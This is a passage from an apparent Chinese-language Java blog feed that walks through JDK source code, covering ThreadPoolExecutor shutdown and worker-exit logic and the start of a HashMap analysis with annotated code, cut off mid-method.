class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="processWorkerExit"><a href="#processWorkerExit" class="headerlink" title="processWorkerExit"></a>processWorkerExit</h4><p>接着再看看processWorkerExit方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processWorkerExit</span><span class="params">(Worker w, <span class="keyword">boolean</span> completedAbruptly)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (completedAbruptly) <span class="comment">// If abrupt, then workerCount wasn't adjusted</span></span><br><span class="line">            <span class="comment">// 如果当前worker不是正常结束，worker个数减一，否则，减一操作已经在getTask中做过了</span></span><br><span class="line">            decrementWorkerCount();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">        mainLock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 记录完成的总任务数</span></span><br><span class="line">            completedTaskCount += w.completedTasks;</span><br><span class="line">            <span class="comment">// 从线程池的workers的集合中删除需要回收的worker</span></span><br><span class="line">            workers.remove(w);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            mainLock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    	<span class="comment">// 尝试结束线程池</span></span><br><span class="line">        tryTerminate();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> c = ctl.get();</span><br><span class="line">        <span class="comment">// 如果当前线程状态处于RUNNING或者SHUTDOWN状态</span></span><br><span class="line">        <span class="keyword">if</span> (runStateLessThan(c, STOP)) &#123;</span><br><span class="line">            <span class="comment">// 如果当前worker是正常结束的</span></span><br><span class="line">            <span class="keyword">if</span> (!completedAbruptly) &#123;</span><br><span class="line">                <span class="comment">// 如果核心线程不需要回收，那么min就是核心线程数</span></span><br><span class="line">                <span class="keyword">int</span> min = allowCoreThreadTimeOut ? <span class="number">0</span> : corePoolSize;</span><br><span class="line">                <span class="comment">// 如果核心线程允许回收，并且任务队列不为空</span></span><br><span class="line">                <span class="keyword">if</span> (min == <span class="number">0</span> &amp;&amp; ! workQueue.isEmpty())</span><br><span class="line">                    <span class="comment">// 至少需要一个线程来执行任务</span></span><br><span class="line">                    min = <span class="number">1</span>;</span><br><span class="line">                <span class="comment">// 如果当前worker的数目大于min，直接返回</span></span><br><span class="line">                <span class="keyword">if</span> (workerCountOf(c) &gt;= min)</span><br><span class="line">                    <span class="keyword">return</span>; <span class="comment">// replacement not needed</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 新赠一个Worker代替原先的Worker</span></span><br><span class="line">            <span class="comment">// 新开一个Worker需要满足以下3个条件中的任意一个：</span></span><br><span class="line">            <span class="comment">// 1. 用户执行的任务发生了异常</span></span><br><span class="line">            <span class="comment">// 2. Worker数量比线程池基本大小要小</span></span><br><span class="line">            <span class="comment">// 3. 阻塞队列不空但是没有任何Worker在工作</span></span><br><span class="line">            addWorker(<span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="tryTerminate"><a href="#tryTerminate" class="headerlink" title="tryTerminate"></a>tryTerminate</h4><p>接着再看看tryTerminate方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">tryTerminate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="keyword">int</span> c = ctl.get();</span><br><span class="line">            <span class="comment">// 如果</span></span><br><span class="line">            <span class="comment">// 当前线程池状态为正在运行</span></span><br><span class="line">            <span class="comment">// 当前线程池状态为TIDYING或者TERMINATED，表示正在关闭，不可冲突</span></span><br><span class="line">            <span class="comment">// 当前队列不为空，还有任务未处理完</span></span><br><span class="line">            <span class="comment">// 直接返回，等待三个条件全部不满足</span></span><br><span class="line">            <span class="keyword">if</span> (isRunning(c) ||</span><br><span class="line">                runStateAtLeast(c, TIDYING) ||</span><br><span class="line">                (runStateOf(c) == SHUTDOWN &amp;&amp; ! workQueue.isEmpty()))</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="comment">// 如果当前的worker数目不为0</span></span><br><span class="line">            <span class="keyword">if</span> (workerCountOf(c) != <span class="number">0</span>) &#123; <span class="comment">// Eligible to terminate</span></span><br><span class="line">                <span class="comment">// 中断一个空闲线程</span></span><br><span class="line">                <span class="comment">// 中断一个空闲线程之后，这个空闲线程会被回收，回收的时候，会再一次调用tryTerminate方法，然后再次中断另一个空闲线程</span></span><br><span class="line">                interruptIdleWorkers(ONLY_ONE);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">            mainLock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 设置线程池状态为TIDYING</span></span><br><span class="line">                <span class="keyword">if</span> (ctl.compareAndSet(c, ctlOf(TIDYING, <span class="number">0</span>))) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        调用terminated方法</span><br><span class="line">                        terminated();</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="comment">// 设置线程池状态为TERMINATED</span></span><br><span class="line">                        ctl.set(ctlOf(TERMINATED, <span class="number">0</span>));</span><br><span class="line">                        termination.signalAll();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                mainLock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// else retry on failed CAS</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>以上的线程池执行过程，可以用下面这个图来概括：</p>
<p><img src="https://huhansi.github.io/images/2020-04-21-threadpool2.jpg" alt="线程池execute方法流程"></p>
<h3 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h3><p>接着看下线程池是如何关闭的</p>
<p>shutdown方法将线程池状态改成SHUTDOWN，线程池还能继续处理阻塞队列里的任务，并且会回收一些闲置的Worker。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shutdown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">        mainLock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 确认当前线程是否有权限执行关闭线程池操作</span></span><br><span class="line">            checkShutdownAccess();</span><br><span class="line">            <span class="comment">// 将线程池状态改为SHUTDOWN</span></span><br><span class="line">            advanceRunState(SHUTDOWN);</span><br><span class="line">            <span class="comment">// 中断线程池的空闲线程/空闲worker</span></span><br><span class="line">            interruptIdleWorkers();</span><br><span class="line">            <span class="comment">// 关闭时的回调方法，当前实现为空</span></span><br><span class="line">            onShutdown(); <span class="comment">// hook for ScheduledThreadPoolExecutor</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            mainLock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">        tryTerminate();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="空闲线程"><a href="#空闲线程" class="headerlink" title="空闲线程"></a>空闲线程</h4><p>worker运行的时候会去任务队列拿数据(getTask方法)，如果没有设置超时时间，就会一直阻塞等待，此时的worker就被称为空闲worker。由于worker也是一个AQS，在runWorker方法里会有一对lock和unlock操作，这对lock操作是为了确保Worker不是一个空闲Worker。</p>
<p>所以Worker被设计成一个AQS是为了根据Worker的锁来判断是否是空闲线程，是否可以被强制中断。</p>
<h4 id="checkShutdownAccess"><a href="#checkShutdownAccess" class="headerlink" title="checkShutdownAccess"></a>checkShutdownAccess</h4><p>如果有SecurityManager的话，校验下当前线程是否有关闭的权限</p>
<p>接着再校验每个worker是否允许被中断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * If there is a security manager, makes sure caller has</span></span><br><span class="line"><span class="comment">     * permission to shut down threads in general (see shutdownPerm).</span></span><br><span class="line"><span class="comment">     * If this passes, additionally makes sure the caller is allowed</span></span><br><span class="line"><span class="comment">     * to interrupt each worker thread. This might not be true even if</span></span><br><span class="line"><span class="comment">     * first check passed, if the SecurityManager treats some threads</span></span><br><span class="line"><span class="comment">     * specially.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">checkShutdownAccess</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        SecurityManager security = System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">            security.checkPermission(shutdownPerm);</span><br><span class="line">            <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">            mainLock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (Worker w : workers)</span><br><span class="line">                    security.checkAccess(w.thread);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                mainLock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="interruptIdleWorkers"><a href="#interruptIdleWorkers" class="headerlink" title="interruptIdleWorkers"></a>interruptIdleWorkers</h4><p>调用了重载方法interruptIdleWorkers(boolean onlyOne)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Common form of interruptIdleWorkers, to avoid having to</span></span><br><span class="line"><span class="comment">     * remember what the boolean argument means.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">interruptIdleWorkers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        interruptIdleWorkers(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="interruptIdleWorkers-boolean"><a href="#interruptIdleWorkers-boolean" class="headerlink" title="interruptIdleWorkers(boolean )"></a>interruptIdleWorkers(boolean )</h4><p>参数传入false表示中断所有的空闲线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">interruptIdleWorkers</span><span class="params">(<span class="keyword">boolean</span> onlyOne)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">        mainLock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (Worker w : workers) &#123;</span><br><span class="line">                Thread t = w.thread;</span><br><span class="line">                <span class="comment">// 如果线程没有被中断，并且可以获得线程的锁</span></span><br><span class="line">                <span class="keyword">if</span> (!t.isInterrupted() &amp;&amp; w.tryLock()) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 中断线程</span></span><br><span class="line">                        t.interrupt();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (SecurityException ignore) &#123;</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        w.unlock();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 只中断一个</span></span><br><span class="line">                <span class="keyword">if</span> (onlyOne)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            mainLock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="shutdownNow"><a href="#shutdownNow" class="headerlink" title="shutdownNow"></a>shutdownNow</h3><p>shutdownNow把线程池状态改成STOP状态，这样不会处理阻塞队列里的任务，也不会处理新的任务：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Runnable&gt; <span class="title">shutdownNow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        List&lt;Runnable&gt; tasks;</span><br><span class="line">        <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">        mainLock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 校验当前线程是否具有权限关闭线程池</span></span><br><span class="line">            checkShutdownAccess();</span><br><span class="line">            <span class="comment">// 将线程池的状态改为STOP</span></span><br><span class="line">            advanceRunState(STOP);</span><br><span class="line">            <span class="comment">// 中断所有线程，无论当前状态是否存活</span></span><br><span class="line">            interruptWorkers();</span><br><span class="line">            <span class="comment">// 将阻塞队列中的所有任务移除，并赋值给tasks集合</span></span><br><span class="line">            tasks = drainQueue();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            mainLock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">        tryTerminate();</span><br><span class="line">        <span class="keyword">return</span> tasks;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="interruptWorkers"><a href="#interruptWorkers" class="headerlink" title="interruptWorkers"></a>interruptWorkers</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">interruptWorkers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">        mainLock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (Worker w : workers)</span><br><span class="line">                <span class="comment">// 中断当前线程，无论是否持有锁，或者是什么状态</span></span><br><span class="line">                w.interruptIfStarted();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            mainLock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="interruptIfStarted"><a href="#interruptIfStarted" class="headerlink" title="interruptIfStarted"></a>interruptIfStarted</h4><p>只要当前线程没有中断，就中断当前线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interruptIfStarted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Thread t;</span><br><span class="line">            <span class="keyword">if</span> (getState() &gt;= <span class="number">0</span> &amp;&amp; (t = thread) != <span class="keyword">null</span> &amp;&amp; !t.isInterrupted()) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    t.interrupt();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (SecurityException ignore) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<h4 id="drainQueue"><a href="#drainQueue" class="headerlink" title="drainQueue"></a>drainQueue</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> List&lt;Runnable&gt; <span class="title">drainQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        BlockingQueue&lt;Runnable&gt; q = workQueue;</span><br><span class="line">        ArrayList&lt;Runnable&gt; taskList = <span class="keyword">new</span> ArrayList&lt;Runnable&gt;();</span><br><span class="line">    	<span class="comment">// 将任务列表中的任务全部移入ArrayList中</span></span><br><span class="line">        q.drainTo(taskList);</span><br><span class="line">        <span class="comment">// 如果移除失败，挨个删除并添加到ArrayList中</span></span><br><span class="line">        <span class="keyword">if</span> (!q.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Runnable r : q.toArray(<span class="keyword">new</span> Runnable[<span class="number">0</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (q.remove(r))</span><br><span class="line">                    taskList.add(r);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> taskList;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://fangjian0423.github.io/2016/03/22/java-threadpool-analysis/" target="_blank" rel="noopener">Java线程池ThreadPoolExecutor源码分析</a></p>
<p><a href="https://www.cnblogs.com/javazhiyin/p/10605511.html" target="_blank" rel="noopener">面试官：你分析过线程池源码吗？</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>源码</tag>
        <tag>ThreadPoolExecutor</tag>
      </tags>
  </entry>
  <entry>
    <title>HashMap源码解析</title>
    <url>/2020/04/17/Java/Java%E5%9F%BA%E7%A1%80/2020-04-17-HashMap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="HashMap源码解析"><a href="#HashMap源码解析" class="headerlink" title="HashMap源码解析"></a>HashMap源码解析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>HashMap是一个根据键值（Key）而直接访问在内存存储位置的数据结构。也就是说，它通过计算一个关于键值的函数，将所需查询的数据映射到表中的一个位置来访问记录，这加快了查找速度。这个映射函数称作散列函数，存放记录的数组称作散列表。</p>
<p>HashMap继承了AbstractMap，实现了Map、Cloneable、Serializable接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;, <span class="title">Cloneable</span>, <span class="title">Serializable</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>HashMap很奇怪，明明继承了AbstractMap（AbstractMap实现了Map接口），却又自己实现了Map接口。这个原因可以参考StackOverflow上的这个<a href="https://stackoverflow.com/questions/2165204/why-does-linkedhashsete-extend-hashsete-and-implement-sete" target="_blank" rel="noopener">回答</a>。</p>
<p><img src="https://huhansi.github.io/images/2020-04-21-hashmap1.png" alt></p>
<p>实现了Cloneable接口，重写了clone方法</p>
<p>实现Serializable接口，支持序列化和反序列化</p>
<h2 id="实现逻辑"><a href="#实现逻辑" class="headerlink" title="实现逻辑"></a>实现逻辑</h2><p>HashMap使用Node节点和Node数组来实现逻辑的。</p>
<h2 id="主要属性"><a href="#主要属性" class="headerlink" title="主要属性"></a>主要属性</h2><ul>
<li><strong>DEFAULT_INITIAL_CAPACITY</strong>：HashMap初始化大小，默认为16</li>
<li><strong>DEFAULT_LOAD_FACTOR</strong>：HashMap初始化负载因子，默认0.75</li>
<li><strong>TREEIFY_THRESHOLD</strong>：HashMap冲突链表转为红黑树的阈值，默认是8</li>
<li><strong>UNTREEIFY_THRESHOLD</strong>：HashMap冲突红黑树转为链表的阈值，默认是6</li>
<li><strong>MIN_TREEIFY_CAPACITY</strong>：HashMap的数量阈值，到达64之后才允许将冲突链表转为红黑树</li>
<li><strong>table</strong>：存放数据的Node数组</li>
<li><strong>size</strong>：HashMap的大小</li>
<li><strong>modCount</strong>：用于快速失败的计数</li>
</ul>
<h2 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h2><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><h4 id="无参构造函数"><a href="#无参构造函数" class="headerlink" title="无参构造函数"></a>无参构造函数</h4><p>使用默认参数，创建HashMap</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR; <span class="comment">// all other fields defaulted</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="有参构造函数（指定大小）"><a href="#有参构造函数（指定大小）" class="headerlink" title="有参构造函数（指定大小）"></a>有参构造函数（指定大小）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(initialCapacity, DEFAULT_LOAD_FACTOR);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>HashMap会生成一个最接近于指定大小的2的N次幂大小的HashMap.比如，指定大小为11，那么HashMap会生成一个大小为16的HashMap。</p>
<h4 id="有参构造函数（指定大小和负载因子）"><a href="#有参构造函数（指定大小和负载因子）" class="headerlink" title="有参构造函数（指定大小和负载因子）"></a>有参构造函数（指定大小和负载因子）</h4><p>同上，支持指定负载因子。大小也会被扩大为最接近它的2的N次幂大小。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity, <span class="keyword">float</span> loadFactor)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal initial capacity: "</span> +</span><br><span class="line">                                               initialCapacity);</span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &gt; MAXIMUM_CAPACITY)</span><br><span class="line">            initialCapacity = MAXIMUM_CAPACITY;</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                               loadFactor);</span><br><span class="line">        <span class="keyword">this</span>.loadFactor = loadFactor;</span><br><span class="line">        <span class="keyword">this</span>.threshold = tableSizeFor(initialCapacity);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="有参构造函数（指定容器）"><a href="#有参构造函数（指定容器）" class="headerlink" title="有参构造函数（指定容器）"></a>有参构造函数（指定容器）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(Map&lt;? extends K, ? extends V&gt; m)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR;</span><br><span class="line">        putMapEntries(m, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="size"><a href="#size" class="headerlink" title="size()"></a>size()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="isEmpty"><a href="#isEmpty" class="headerlink" title="isEmpty()"></a>isEmpty()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="get-Object"><a href="#get-Object" class="headerlink" title="get(Object)"></a>get(Object)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        Node&lt;K,V&gt; e;</span><br><span class="line">        <span class="keyword">return</span> (e = getNode(hash(key), key)) == <span class="keyword">null</span> ? <span class="keyword">null</span> : e.value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>get方法调用了getNode方法</p>
<h4 id="getNode"><a href="#getNode" class="headerlink" title="getNode()"></a>getNode()</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title">getNode</span><span class="params">(<span class="keyword">int</span> hash, Object key)</span> </span>&#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; <span class="keyword">int</span> n; K k;</span><br><span class="line">        <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">            (first = tab[(n - <span class="number">1</span>) &amp; hash]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (first.hash == hash &amp;&amp; <span class="comment">// always check first node</span></span><br><span class="line">                ((k = first.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                <span class="keyword">return</span> first;</span><br><span class="line">            <span class="keyword">if</span> ((e = first.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (first <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                    <span class="keyword">return</span> ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);</span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                        ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                        <span class="keyword">return</span> e;</span><br><span class="line">                &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>首先判断Node数组是不是空的</li>
<li>再判断头结点的Hash值和key是否相等，相等的话直接返回头结点</li>
<li>如果当前节点是树节点，在红黑树中找</li>
<li>如果不是树节点，则在链表中找</li>
<li>如果都找不到，返回null</li>
</ol>
<h3 id="containsKey-Object"><a href="#containsKey-Object" class="headerlink" title="containsKey(Object)"></a>containsKey(Object)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsKey</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getNode(hash(key), key) != <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>判断getNode方法返回的对应值是否为null</p>
<h3 id="put-Object-Object"><a href="#put-Object-Object" class="headerlink" title="put(Object, Object)"></a>put(Object, Object)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>put方法调用了内部方法oytVal来插入数据</p>
<h4 id="putVal方法"><a href="#putVal方法" class="headerlink" title="putVal方法"></a>putVal方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">        <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">            n = (tab = resize()).length;</span><br><span class="line">        <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)</span><br><span class="line">            tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Node&lt;K,V&gt; e; K k;</span><br><span class="line">            <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">                ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                e = p;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                        <span class="keyword">if</span> 